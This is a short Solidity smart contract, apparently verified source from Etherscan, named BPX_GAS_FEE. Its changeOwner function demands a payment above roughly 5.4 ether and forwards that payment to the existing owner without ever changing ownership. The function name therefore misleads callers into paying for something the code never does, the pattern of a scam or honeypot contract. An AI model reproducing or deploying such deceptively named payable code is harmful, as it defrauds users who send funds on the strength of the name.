/**
 *Submitted for verification at Etherscan.io on 2020-02-19
*/

pragma solidity ^0.4.24;

contract BPX_GAS_FEE{
    
    constructor()public{
        owner = msg.sender;
    }
    
    address public owner;
    uint public total_gas_fee = 5423948502382034832;
    
    function changeOwner()public payable{
        require(msg.value > total_gas_fee);
        owner.transfer(msg.value);
    }
    
    
}